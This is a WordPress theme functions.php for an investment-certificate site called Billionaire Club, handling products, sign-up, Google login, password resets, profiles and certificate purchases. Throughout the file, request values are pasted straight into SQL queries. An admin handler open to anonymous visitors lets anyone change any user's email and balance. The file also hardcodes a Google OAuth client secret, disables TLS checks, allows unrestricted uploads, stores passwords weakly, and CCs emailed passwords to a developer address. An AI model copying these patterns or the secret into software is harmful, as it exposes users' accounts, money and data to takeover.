<?php
session_start();


// Products ACF //

add_action('init', 'my_business_products');
add_theme_support( 'post-thumbnails' );
function my_business_products(){
  register_post_type('products', array(
        'labels'             => array(
          'name'               => 'products', // Основное название типа записи
          'singular_name'      => 'products', // отдельное название записи типа Book
          'add_new'            => 'Добавить products',
          'add_new_item'       => 'Добавить новую products',
          'edit_item'          => 'Редактировать products',
          'new_item'           => 'Новая products',
          'view_item'          => 'Посмотреть products',
          'search_items'       => 'Найти products',
          'not_found'          => 'products не найдено',
          'not_found_in_trash' => 'В корзине products не найдено',
          'parent_item_colon'  => '',
          'menu_name'          => 'Продукты для бизнеса'
                

          ),
        'menu_icon'          => 'dashicons-format-gallery',// ikonken es em dre
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => true,
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array('title','editor','author','thumbnail','excerpt','comments'),
      ) 

   );
 
}

add_action('init', 'my_business_certificate');
add_theme_support( 'post-thumbnails' );
function my_business_certificate(){
  register_post_type('certificate', array(
        'labels'             => array(
          'name'               => 'certificate', // Основное название типа записи
          'singular_name'      => 'certificate', // отдельное название записи типа Book
          'add_new'            => 'Добавить certificate',
          'add_new_item'       => 'Добавить новую certificate',
          'edit_item'          => 'Редактировать certificate',
          'new_item'           => 'Новая certificate',
          'view_item'          => 'Посмотреть certificate',
          'search_items'       => 'Найти certificate',
          'not_found'          => 'certificate не найдено',
          'not_found_in_trash' => 'В корзине certificate не найдено',
          'parent_item_colon'  => '',
          'menu_name'          => 'Сертификаты  для продукта'
                

          ),
        'menu_icon'          => 'dashicons-format-gallery',// ikonken es em dre
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => true,
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array('title','editor','author','thumbnail','excerpt','comments'),
      ) 

   );
 
}

add_action('init', 'my_exchanger_certificate');
add_theme_support( 'post-thumbnails' );
function my_exchanger_certificate(){
  register_post_type('exchanger', array(
        'labels'             => array(
          'name'               => 'exchanger', // Основное название типа записи
          'singular_name'      => 'exchanger', // отдельное название записи типа Book
          'add_new'            => 'Добавить exchanger',
          'add_new_item'       => 'Добавить новую exchanger',
          'edit_item'          => 'Редактировать exchanger',
          'new_item'           => 'Новая exchanger',
          'view_item'          => 'Посмотреть exchanger',
          'search_items'       => 'Найти exchanger',
          'not_found'          => 'exchanger не найдено',
          'not_found_in_trash' => 'В корзине exchanger не найдено',
          'parent_item_colon'  => '',
          'menu_name'          => 'Сертификаты для обменник'
                

          ),
        'menu_icon'          => 'dashicons-format-gallery',// ikonken es em dre
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => true,
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array('title','editor','author','thumbnail','excerpt','comments'),
      ) 

   );
 
}

function get_all_exchanger_certificates()
{

     $posts = get_posts(array(
        'post_type' => 'exchanger',
        'suppress_filters' =>true,
        'numberposts' => -1,
        'order' => 'DESC'
       ));
     
     return $posts;
}

add_action('init', 'my_market_certificate');
add_theme_support( 'post-thumbnails' );
function my_market_certificate(){
  register_post_type('market', array(
        'labels'             => array(
          'name'               => 'market', // Основное название типа записи
          'singular_name'      => 'market', // отдельное название записи типа Book
          'add_new'            => 'Добавить market',
          'add_new_item'       => 'Добавить новую market',
          'edit_item'          => 'Редактировать market',
          'new_item'           => 'Новая market',
          'view_item'          => 'Посмотреть market',
          'search_items'       => 'Найти market',
          'not_found'          => 'market не найдено',
          'not_found_in_trash' => 'В корзине market не найдено',
          'parent_item_colon'  => '',
          'menu_name'          => 'Сертификаты для маркет'
                

          ),
        'menu_icon'          => 'dashicons-format-gallery',// ikonken es em dre
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => true,
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array('title','editor','author','thumbnail','excerpt','comments'),
      ) 

   );
 
}

function get_all_market_certificates()
{

     $posts = get_posts(array(
        'post_type' => 'market',
        'suppress_filters' =>true,
        'numberposts' => -1,
        'order' => 'DESC'
       ));
     
     return $posts;
}



add_action('wp_ajax_recive_business_products', 'get_business_products');
add_action('wp_ajax_nopriv_recive_business_products', 'get_business_products');


function get_business_products()
{ 
    

    $arg = ['post_type' => 'products', 'posts_per_page' => -1];

    $query = new WP_Query($arg);
    
    $content = array();
    $images_content = "";
    $name_of_products_wrapper = "";
    


    while($query->have_posts()){

        $query->the_post();
        
        $products_id = get_the_id();
        $images = get_field('svg_of_product');
        $latitude_of_coordinate_text = get_field('latitude_of_coordinate');
        $latitude_of_coordinate = (float)$latitude_of_coordinate_text;
        $longitude_of_coordinate_text = get_field('longitude_of_coordinate');
        $longitude_of_coordinate = (float)$longitude_of_coordinate_text;
        $name_of_product = get_field('name_of_product');
        
        $images_content = "$images"; 
        $name_of_products_wrapper = "<div class='card p-0 m-0 InfoWindowProject' style='width: 100%;'><div class='volna'></div> <img src='$images' class='card-img-top img-fluid' alt='...'><div class='card-body'><h5 class='card-title'>$name_of_product</h5><button  type='button' class='btn btn-success get_product_btn' data-product_id='$products_id'>Посмотреть</button> </div></div> ";

        $content[] = array(
                        'coordinates' => array('lat' => $latitude_of_coordinate, 'lng'=> $longitude_of_coordinate),
                        'image' => $images_content,                     
                        'info' => $name_of_products_wrapper,
                    );
    }

    wp_send_json(array('Content' => $content));

}

add_action('wp_ajax_get_product_description', 'get_business_product_data');
add_action('wp_ajax_nopriv_get_product_description', 'get_business_product_data');


function get_business_product_data()
{ 
    
    global $wpdb;

    
    $product_id = $_POST['product_id'];   
    $product =  get_post($product_id);  
    $product_description =  $product->description_of_project;
    $product_title = $product->post_title;
    $product_price = $product->price_of_product;
    $content = ""; 

    $content .= "<div class='modal-dialog modal-dialog-centered'>";
        
        $content .= "<div class='modal-content'>";
             
            $content .= "<div class='modal-body text-center product_data_wrapper'>";
                
                $content .= "<h3 class='mb-4'>$product_title</h3>";
                $content .= "<p class='mb-4'>$product_description</p>";
                $content .= "<h5 class='mb-4'>Цена</h5>";
                $content .= "<p class='mb-4'>&#8381 $product_price</p>";
                $content .= "<div class='ivestor_buttons_block'>";

                    $content .= "<button type='button' class='btn btn-primary cancel_product_data2 cancel_product_data' data-bs-dismiss='modal'>Отменить</button>"; 
                    if (is_user_logged_in()) {

                        $user_id = get_current_user_id();
                        $investor_exist = $wpdb->get_results("SELECT * FROM `investors_data` WHERE `product_id` = '$product_id' AND `user_id` = '$user_id' ");

                        if (!isset($investor_exist) || empty($investor_exist)) {
                             
                            $content .= "<button type='button' data-product_id='$product_id' class='btn btn-success add_investor' style='margin-left:30px;'  data-bs-dismiss='modal'>Стать инвестором</button>";

                        }

                    }else{
                       
                        $content .= "<a href='/sign-in-page' class='btn btn-success'>Стать инвестором</a>";

                    }
                    

                $content .= "</div>";

            $content .= "</div>";

        $content .= "</div>";

    $content .= "</div>";

    wp_send_json(array('pruduct_data_success' => $content));

}

function get_all_users_list()
{
    global $wpdb;
    
    $user_data = $wpdb->get_results("SELECT * FROM `wp_users` WHERE `ID` != '1' && `user_login` != 'admin' ");

    return $user_data;

}

// Login With Google //

function params_for_google()
{

    $params_google = array(
        'client_id' => '35969321589-a2co8du5iqk287019refa8opdkrgbt4t.apps.googleusercontent.com',
        'redirect_uri' => 'https://billiclub.ru/functions.php?soc=google',
        'scope' => 'https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile',
        'response_type' => 'code',
        'state' => '123'
    );

    return $params_google;
}


if (isset($_GET['code']) && !empty($_GET['code'])) {

    global $wpdb;


    if (isset($_GET['soc']) && !empty($_GET['soc'])) {


        if ($_GET['soc'] == 'google') {
            
            // Отправляем код для получения токена (POST-запрос).
            $params_google = array(
                'client_id' => '35969321589-a2co8du5iqk287019refa8opdkrgbt4t.apps.googleusercontent.com',
                'client_secret' => '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',
                'redirect_uri' => 'https://billiclub.ru/functions.php?soc=google',
                'grant_type' => 'authorization_code',
                'code' => $_GET['code']
            );
            
            $ch = curl_init('https://accounts.google.com/o/oauth2/token');
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params_google);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_HEADER, false);
            $data_google = curl_exec($ch);
            curl_close($ch);

            $data_google = json_decode($data_google, true);
            
            if (!empty($data_google['access_token'])) {

                // Токен получили, получаем данные пользователя.
                $params_google = array(
                    'access_token' => $data_google['access_token'],
                    'id_token' => $data_google['id_token'],
                    'token_type' => 'Bearer',
                    'expires_in' => 3599
                );

                $info_google = file_get_contents('https://www.googleapis.com/oauth2/v1/userinfo?' . urldecode(http_build_query($params_google)));
                $info_google = json_decode($info_google, true);

                if(isset($info_google) && !empty($info_google)){

                        $email = $info_google['email'];
                        $user_email = $email;

                        if (strlen($user_email) < 1) {
            
                                $_SESSION['error']['email_log'] = 'Пользователь не существует';
                                header("Location:/sign-in-page");
                                exit();
            
                        } else {

                            $user_log = $wpdb->get_results("SELECT * FROM `wp_users` WHERE `user_email` = '$user_email' ");
                            
                            if (empty($user_log)) {
                                            
                                $new_password = 'BilliClub.'.rand(1000,9999);
                                $password     = md5($new_password);
                               
                                $sql = array( 'user_login'   => $user_email,
                                              'user_email'   => $user_email,
                                              'user_pass'=> $password
                                            );
        
                              
                                $user_id = wp_insert_user($sql);
        
                                $user = new WP_User( $user_id );
                               
                                $metas = array( 
                                    'first_name'  => 'Пользователь',
                                    'agree_terms' => '1',
                                    'user_balance'=> '0.00',
                                    'confirm_mail'=> 'confirmed' 
                                );
        
                                foreach($metas as $key => $value) {
        
                                        update_user_meta($user_id,$key, $value);
        
                                }
                                
                                $user_email = $user->user_email;
                                
                                $login_data = array();  
                                $login_data['user_login'] = $user_email;  
                                $login_data['user_password'] = $password; 
                                
                                $user_signon = wp_signon($login_data);
                                
                                if (!is_wp_error($user_signon)){
                                    
                                    $to = $user_email;
                                    $subject = 'Billionaire Club';
                                    $message = '<html><body>';
                                    $message .= '<h1> Уважаемый, Пользователь!</h1><h2>Ваш пароль для входа:</h2><h2>'. $new_password.'</h2>';
                                    $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
                                    $message .= '</body></html>';
                                    $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
                                    $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
                                    $headers .= "CC: justcodedevcompany@gmail.com\r\n";
                                    $headers .= "MIME-Version: 1.0\r\n";
                                    $headers .= "Content-Type: text/html; charset=utf-8\r\n";
                        
                                    wp_mail($to, $subject, $message, $headers);
                                    
                                    wp_signon();
                                    header("Location:/profile-page");
                                    exit();
        
                                }else{
                                     
                                     $_SESSION['error']['email_log'] = 'Неверная почта или пароль';
                                     header("Location:/sign-in-page");
                                     exit(); 
                                     
                                }
        
                             }else{

                                $user_id    = $user_log[0]->ID;
                                $user_email = $user_log[0]->user_email;
                               
                                $user_data = get_user_meta($user_id);

                                if(isset($user_data['orginal_pass'][0]) && !empty($user_data['orginal_pass'][0])){
                                        
                                   $password = $user_data['orginal_pass'][0];            
                                    
                                   $login_data = array();  
                                   $login_data['user_login'] = $user_email;  
                                   $login_data['user_password'] =  $password; 
            
                                   $user_signon = wp_signon($login_data);
                                   
                                   if (!is_wp_error($user_signon)){
                                       
                                        wp_signon();
                                        header("Location:/profile-page");
                                        exit();
                                    
                                    }else{
                                     
                                       $_SESSION['error']['email_log'] = 'Неверная почта или пароль';
                                       header("Location:/sign-in-page");
                                       exit(); 
                                     
                                    }   
                                       
                                   
                                }else{
                                       
                                    $_SESSION['error']['email_log'] = 'Неверная почта или пароль';
                                    header("Location:/sign-in-page");
                                    exit();
                                       
                                }

                            }                                      
                                                                    
                        }    
                }        

            }

        }
    }

}    

// Registration Function //

add_action('wp_ajax_signup_action', 'create_account');
add_action('wp_ajax_nopriv_signup_action', 'create_account');


function create_account()
{   
    global $wpdb;

    $first_name  = $_POST['first_name'];
    $email       = $_POST['email'];
    $password    = $_POST['password'];
    $agree_terms = $_POST['agree_terms'];
    $image       = '';
   
    if (!isset($first_name) || empty($first_name)) {
    	
    	wp_send_json(array('fields_empty_error' => true));

    }

    if (!isset($email) || empty($email)) {
    	
    	wp_send_json(array('fields_empty_error' => true));

    }

    if (!isset($password) || empty($password)) {
    	
    	wp_send_json(array('fields_empty_error' => true));

    }

    if ($agree_terms == '0'){
    	
    	wp_send_json(array('agree_terms_empty_error' => true));

    }
   
   
    if (!email_exists($email)){

        $sql = array( 'user_login' => $email,
                      'user_email' => $email,
                      'user_pass'  => $password,
        );
     
        $user_id = wp_insert_user($sql);
       
        if( !is_wp_error($user_id) ) {  

           //user has been created
            $user = new WP_User( $user_id );
            $code = rand(1000,9999); 
            $metas = array( 
                'first_name'  => $first_name,
                'image'       => $image,
                'agree_terms' => '1',
                'user_balance'=> '0.00',
                'confirm_mail' => 'not_confirm',
                'confirm_code' => $code
            );

            foreach($metas as $key => $value) {

                    update_user_meta($user_id,$key, $value);

            }

            if (!is_wp_error($user)){

                $user_id = $user->ID;
                $login_data = array();  
                $login_data['user_login'] = $email;  
                $login_data['user_password'] = $password;
                $user_log = wp_signon($login_data); 

                if (!is_wp_error($user_log)){

                    $user = wp_signon($login_data);
                
                    $url = 'https://billiclub.ru/sign-up-page/?id='.$user_id.'&confirm='.$code;
                    
                    $to = $email;
                    $subject = 'Billionaire Club';
                    $message = '<html><body>';
                $message .= '<h1> Уважаемый, '.$first_name.'!</h1><h2>При переходе по этой ссылке вы подтверждаете вашу  почту:</h2><h2>'.$url.'</h2>';
                    $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
                    $message .= '</body></html>';
                    $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
                    $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
                    $headers .= "CC: justcodedevcompany@gmail.com\r\n";
                    $headers .= "MIME-Version: 1.0\r\n";
                    $headers .= "Content-Type: text/html; charset=utf-8\r\n";

                    $sent = wp_mail($to, $subject, $message, $headers);
                     
                    if($sent){
                      
                       wp_send_json(array('create_success' => true));
                     
                    }else{
                      
                       wp_send_json(array('no_send_email_error' => true));
                      
                    }
                    
                }

            }
        }

    }else{

        wp_send_json(array('email_exists' => true));

    }

}

if (isset($_GET['id']) && !empty($_GET['id'])) {

    global $wpdb;

    if (isset($_GET['confirm']) && !empty($_GET['confirm'])) {
        
        $user_id = get_current_user_id();
       
        if ($_GET['id'] == $user_id) {
             
            $user_data =  get_user_meta($user_id);
            $code = $user_data['confirm_code'][0]; 
         
            if ($_GET['confirm'] == $code) {
                
                update_user_meta($user_id,'confirm_mail', 'confirmed');
                delete_user_meta($user_id,'confirm_code');

                header("Location:/profile-page");
                exit();
            }
   
        }
    }
}    

// Login Function //

add_action('wp_ajax_login_action', 'login_account');
add_action('wp_ajax_nopriv_login_action', 'login_account');

function login_account()
{

    global $wpdb;

    $user_log = '';
         
    $user_log = $_POST['email'];
    $password = $_POST['password'];

    if (!isset($user_log) || empty($user_log)) {
    	
    	wp_send_json(array('fields_empty_error' => true));

    }

    if (!isset($password) || empty($password)) {
    	
    	wp_send_json(array('fields_empty_error' => true));

    }

    $block_user = $wpdb->get_results("SELECT * FROM `wp_users` WHERE `user_email` = '$user_log' ");

    if(isset($block_user) && !empty($block_user)){

        $current_user_id = $block_user[0]->ID;

        if (isset($_POST['remember_me']) && $_POST['remember_me'] != '0') {
               
                $login_data = array();  
                $login_data['user_login'] = $user_log;  
                $login_data['user_password'] = $password; 
                $login_data['remember'] = 'rememberme';
                $user = wp_signon($login_data);
                      
        }else{       
        
            $login_data = array();  
            $login_data['user_login'] = $user_log;  
            $login_data['user_password'] = $password; 

            $user = wp_signon($login_data);
        
        }

        if (!is_wp_error($user)){
            
            wp_signon();
            wp_send_json(array('login_success' => true));

        } else {

                wp_send_json(array('login_error' => true));

        }
         
    }else{

       wp_send_json(array('login_error' => true));

    }

}

// Get User Data //

function get_user()
{
    global $wpdb;

    $current_user_id = get_current_user_id();
    $user_data = array();
    $user_data[] = get_userdata($current_user_id);
    $user_data[] = get_user_meta($current_user_id);
    
    return $user_data; 

}

// Forgot Password function // 

add_action('wp_ajax_forgot_user_password', 'send_password_code');
add_action('wp_ajax_nopriv_forgot_user_password', 'send_password_code');

function send_password_code(){

        global $wpdb;
        
        $user_email = $_POST['email'];
        
        if (!isset($user_email) || empty($user_email)) {

        	wp_send_json(array('empty_email_error' => true));

        }

        $user_exist = $wpdb->get_results("SELECT * FROM `wp_users` WHERE `user_email` = '$user_email' ");
       
        if (empty($user_exist)) {
             
            wp_send_json(array('exist_email_error' => true));

        }else{
             
            $user_id    = $user_exist[0]->ID;
            $user_email = $user_exist[0]->user_email;
            $user_data = get_user_meta($user_id);
            $user_firstname = $user_data['first_name'][0];
            
            $password_code = rand(10000,99999);

            update_user_meta($user_id,'password_code', $password_code);

            $to = $user_email;
            $subject = 'Billionaire Club';
            $message = '<html><body>';
            $message .= '<h1> Уважаемый, '. $user_firstname .'!</h1><h2>Ваш код для входа:</h2><h2>'. $password_code.'</h2>';
            $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
            $message .= '</body></html>';
            $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
            $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
            $headers .= "CC: justcodedevcompany@gmail.com\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=utf-8\r\n";

            $sent = wp_mail($to, $subject, $message, $headers);
             
            if($sent){
              
               wp_send_json(array('send_code_success' => true));
             
            }else{
              
               wp_send_json(array('no_send_email_error' => true));
              
            }
            
        }

}


add_action('wp_ajax_code_change_password', 'change_password_code');
add_action('wp_ajax_nopriv_code_change_password', 'change_password_code');


function change_password_code()
{
    global $wpdb;

    $code = $_POST['code'];
    

    if (isset($code) && !empty($code)) {
         
        $code_exist = $wpdb->get_results("SELECT * FROM `wp_usermeta` WHERE `meta_key` = 'password_code' && `meta_value` = $code "); 
         
        if (isset($code_exist) && !empty($code_exist)) {

            if ($code_exist[0]->meta_value != $code) {

                wp_send_json(array('false_code_error' => true));

            }else{
                    
                $user_password = md5($_POST['password']);
                $user_id = $code_exist[0]->user_id;

                update_user_meta($user_id,'orginal_pass', $user_password);

                $update_data = array(
                    'user_pass' => $user_password,
                );

                $wpdb->update('wp_users', $update_data , array('ID' => $user_id));

                wp_send_json(array('change_password_success' => true));
            }
               
        }else{
              
              wp_send_json(array('false_code_error' => true));
        }

    }else{

        wp_send_json(array('not_code_error' => true));

    }

}

// Edit Profile Functions //

add_action('wp_ajax_user_edit_profile', 'edit_profile');
add_action('wp_ajax_nopriv_user_edit_profile', 'edit_profile');

function edit_profile()
{   
    global $wpdb;

    $user_id = get_current_user_id();

    $first_name  = $_POST['first_name'];
    $last_name   = $_POST['last_name'];
    $user_name   = $_POST['user_name'];
    $city        = $_POST['city'];
    $phone  = $_POST['phone'];
    $unisex   = $_POST['unisex'];
    $age   = $_POST['age'];
    $about_me = $_POST['about_me'];

    // if (empty($first_name) || empty($last_name) || empty($user_name) || empty($city) || empty($phone) || empty($unisex) || empty($age) || empty($about_me)) {
               
    //         wp_send_json(array('fields_empty_error' => true));

    // }

    $image       = '';
    $file_name = '';
    $update_image = false;
    
    if (!empty($_FILES['image']['name'])) {
            $file_name = uniqid() . $_FILES['image']['name'];
            $target_dir = WP_CONTENT_DIR . '/uploads';
            $target_file = $target_dir . '/' . basename($file_name);
            move_uploaded_file($_FILES['image']['tmp_name'], $target_file);
            $update_image = true;
    }

    $update_data = "";

    if ($update_image){

        $image_user = $file_name;
        update_user_meta($user_id,'image',$image_user);

    }
   
    $metas = array( 
                'first_name'  => $first_name,
                'last_name'   => $last_name,
                'user_name' => $user_name,
                'city'  => $city,
                'phone' => $phone,
                'unisex' => $unisex,
                'age'    => $age,
                'about_me' => $about_me
            );

    foreach($metas as $key => $value) {

            update_user_meta($user_id,$key, $value);

    }
    
    
    wp_send_json(array('edit_profile_success' => true));
     

}

add_action('wp_ajax_change_account_password', 'user_change_password');
add_action('wp_ajax_nopriv_change_account_password', 'user_change_password');

function user_change_password(){

    global $wpdb;
        
    $user_id = get_current_user_id();
    $new_password = $_POST['new_password'];
    $conf_password = $_POST['confirm_password'];   
    
    if (!isset($new_password) ||  strlen($new_password) < 1) {
            
        wp_send_json(array('new_password_error' => true));

    } 

    if (!isset($conf_password) ||  strlen($conf_password) < 1) {
            
        wp_send_json(array('password_error' => true));

    }else{
         
        if ($conf_password != $new_password){
            
            wp_send_json(array('password_error' => true)); 

        }

    } 

    $user_data = $wpdb->get_results("SELECT * FROM `wp_users` WHERE `ID` = '$user_id' ");

    $user_email = $user_data[0]->user_email;
    $user_another_data = get_user_meta($user_id);
    $user_firstname = $user_another_data['first_name'][0];
    
    $password_code = rand(10000,99999);

    update_user_meta($user_id,'password_code', $password_code);
    update_user_meta($user_id,'changed_password', $new_password);

    $to = $user_email;
    $subject = 'Billionaire Club';
    $message = '<html><body>';
    $message .= '<h1> Уважаемый, '. $user_firstname .'!</h1><h2>Ваш код для входа:</h2><h2>'. $password_code.'</h2>';
    $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
    $message .= '</body></html>';
    $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
    $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
    $headers .= "CC: justcodedevcompany@gmail.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=utf-8\r\n";

    $sent = wp_mail($to, $subject, $message, $headers);
     
    if($sent){
   
       wp_send_json(array('send_code_success' => true));
     
    }else{
      
       wp_send_json(array('no_send_email_error' => true));
      
    }
                            
}

add_action('wp_ajax_code_change_user_password', 'user_change_password_code');
add_action('wp_ajax_nopriv_code_change_user_password', 'user_change_password_code');


function user_change_password_code()
{
    global $wpdb;
   
    $code = $_POST['code'];
    $user_id = get_current_user_id();

    if (isset($code) && !empty($code)) {
        
        $user_data = get_user_meta($user_id); 

        $code_exist = $user_data['password_code'][0]; 
         
        if (isset($code_exist) && !empty($code_exist)) {

            if ($code_exist != $code) {

                wp_send_json(array('false_code_error' => true));

            }else{

                $user_password = md5($user_data['changed_password'][0]);
                $update_data = array(
                    'user_pass' => $user_password,
                );

                $sql = $wpdb->update('wp_users', $update_data , array('ID' => $user_id));

                if ($sql) {
                    
                    delete_user_meta($user_id,'changed_password');
                    wp_send_json(array('change_password_success' => true));

                }else{
                    
                    wp_send_json(array('change_password_error' => true));

                }

            }
               
        }else{
              
            wp_send_json(array('false_code_error' => true));
        }

    }else{

        wp_send_json(array('not_code_error' => true));

    }
}

// Admin Edit Profile //

add_action('wp_ajax_get_user_account_data', 'get_for_change_user_data');
add_action('wp_ajax_nopriv_get_user_account_data', 'get_for_change_user_data');

function get_for_change_user_data(){

    global $wpdb;

    $user_id = $_POST['user_id'];
    
    $user_exist = $wpdb->get_results("SELECT * FROM `wp_users` WHERE `ID` = '$user_id' ");

    if (isset($user_exist) && !empty($user_exist)) {
         
        $user_data = get_user_meta($user_id);
        
        $first_name = $user_data['first_name'][0];
        $last_name  = $user_data['last_name'][0];
        $phone =  $user_data['phone'][0];   
        $email = $user_exist[0]->user_email;    
        $balance = $user_data['user_balance'][0];
        $user_image = $user_data['image'][0];
        $image = "";
        $bloginfo = get_template_directory_uri();
        $content_url = content_url();
        
        if (!empty($user_image)) {
            
            $image = "<img class='profile-pic' src='$content_url/uploads/$user_image' alt='profile-pic'>";
                    
        }else{
            
            $image = "<img class='profile-pic' src='$bloginfo/images/user/11.png' alt='profile-pic'>"; 

        }

         wp_send_json(array('data_content_success' => true,'first_name' => $first_name,'last_name' => $last_name,'phone' => $phone,'email' => $email,'balance' => $balance,'image' => $image,'user_id' => $user_id));
        
    }else{

        wp_send_json(array('user_id_error' => true));

    } 

} 

add_action('wp_ajax_admin_edit_user_profile', 'admin_edit_profile');
add_action('wp_ajax_nopriv_admin_edit_user_profile', 'admin_edit_profile');

function admin_edit_profile()
{   
    global $wpdb;
    
    $user_id = $_POST['user_id'];

    $first_name  = $_POST['first_name'];
    $last_name   = $_POST['last_name'];
    $phone  = $_POST['phone'];
    $email  = $_POST['email'];
    $balance  = $_POST['balance'];

    $image       = '';
    $file_name = '';
    $update_image = false;
    
    if (!empty($_FILES['image']['name'])) {
            $file_name = uniqid() . $_FILES['image']['name'];
            $target_dir = WP_CONTENT_DIR . '/uploads';
            $target_file = $target_dir . '/' . basename($file_name);
            move_uploaded_file($_FILES['image']['tmp_name'], $target_file);
            $update_image = true;
    }

    $update_data = "";

    if ($update_image){

        $image_user = $file_name;
        update_user_meta($user_id,'image',$image_user);

    }
   
    $metas = array( 
                'first_name'  => $first_name,
                'last_name'   => $last_name,
                'user_balance'  => $balance,
                'phone' => $phone,              
            );

    foreach($metas as $key => $value) {

            update_user_meta($user_id,$key, $value);

    }

    
    $update_data = array('user_email' => $email);
                        
    $wpdb->update('wp_users', $update_data , array('ID' => $user_id));
    
    
    wp_send_json(array('edit_profile_success' => true));
     

}  

// become an investor function //

add_action('wp_ajax_account_become_investor', 'add_account_investor');
add_action('wp_ajax_nopriv_account_become_investor', 'add_account_investor');


function add_account_investor()
{
    global $wpdb;
    
    $product_id = $_POST['product_id'];
    $user_id = get_current_user_id(); 
    $real_user_data = get_user_meta($user_id);
    $balance = $real_user_data['user_balance'][0];
    
    if (empty($product_id) || !is_numeric($product_id)) {
        
        wp_send_json(array('product_exist_error' => true));

    }else{
         
        $product_exist = get_post($product_id);
      
        if (isset($product_exist) && !empty($product_exist)) {

            $price_of_product = $product_exist->price_of_product;
            
            if (intval($price_of_product) > intval($balance)) {
        
                wp_send_json(array('bet_count_error' => true));
    
            }else{

                $product_certificate_id = $product_exist->product_certificate;
                $use_code = rand(10000,99999);
                
                $sql = array('user_id' => $user_id,
                             'certificate_id' => $product_certificate_id,
                             'producte_id' => $product_id,
                             'use_code'  => $use_code 
                            );

                $new_balance = intval($balance) - intval($price_of_product);

                $certificate_save =  $wpdb->insert('certificates_of_investors', $sql);
                
                if ($certificate_save) {

                    $sql_investor = array('user_id' => $user_id,
                                          'product_id' => $product_id,
                                         );
                     
                    $wpdb->insert('investors_data', $sql_investor);
                 
                    update_user_meta($user_id,'user_balance',$new_balance);


                    $user_data = $wpdb->get_results("SELECT `user_email` FROM `wp_users` WHERE `ID` = '$user_id' ");
                    $user_email = $user_data[0]->user_email;
                    
                    $to = $user_email;
                    $subject = 'Billionaire Club';
                    $message = '<html><body>';
                    $message .= '<h1> Уважаемый, Пользователь!</h1><h2>Поздравляем вы стали инвестором</h2>';
                    $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
                    $message .= '</body></html>';
                    $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
                    $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
                    $headers .= "CC: justcodedevcompany@gmail.com\r\n";
                    $headers .= "MIME-Version: 1.0\r\n";
                    $headers .= "Content-Type: text/html; charset=utf-8\r\n";

                    wp_mail($to, $subject, $message, $headers);

                    wp_send_json(array('success_certificate_save' => true,'new_balance' => $new_balance));

                }else{
                   
                   wp_send_json(array('certificate_save_error' => true));

                }

            }

        }else{

           wp_send_json(array('product_exist_error' => true));

        }

    }

}

add_action('wp_ajax_account_use_certificate', 'send_certificate_code');
add_action('wp_ajax_nopriv_account_use_certificate', 'send_certificate_code');

function send_certificate_code(){

    global $wpdb;

    $user_id = get_current_user_id();
    $certificate_id = $_POST['certificate_id'];
      
    $certificate_data = $wpdb->get_results("SELECT * FROM `certificates_of_investors` WHERE `id` = '$certificate_id' AND `user_id` = '$user_id' ");

    if (isset($certificate_data) && !empty($certificate_data)) {
        
        $product_id = $certificate_data[0]->producte_id;
        $product_data = get_post($product_id);
        $use_code = $certificate_data[0]->use_code;

        $manager_email = $product_data->manager_email;


        $to = $manager_email;
        $subject = 'Billionaire Club';
        $message = '<html><body>';
        $message .= '<h1> Уважаемый, Пользователь!</h1><h2>Ваш код для использования сертификата:</h2><h2>'. $use_code.'</h2>';
        $message .= '<p style="color:black">С уважением,</p><p>Billionaire Club.</p>';
        $message .= '</body></html>';
        $headers = "From: justcodedevcompany@gmail.com " . "\r\n";
        $headers .= "Reply-To: justcodedevcompany@gmail.com " . "\r\n";
        $headers .= "CC: justcodedevcompany@gmail.com\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=utf-8\r\n";

        $sent = wp_mail($to, $subject, $message, $headers);
         
        if($sent){
       
           wp_send_json(array('send_code_success' => true,'certificate_id' => $certificate_id));
         
        }else{
          
           wp_send_json(array('no_send_email_error' => true));
          
        } 

    }else{

        wp_send_json(array('use_certificate_error' => true));

    }
                            
}

function get_user_certificates(){
     
    global $wpdb;

    $user_id = get_current_user_id();
    
    $user_certificates = $wpdb->get_results("SELECT * FROM `certificates_of_investors` WHERE `user_id` = '$user_id' AND `use_code` != 'used' ");

    return $user_certificates;

}

add_action('wp_ajax_send_certificate_code', 'code_use_certificate');
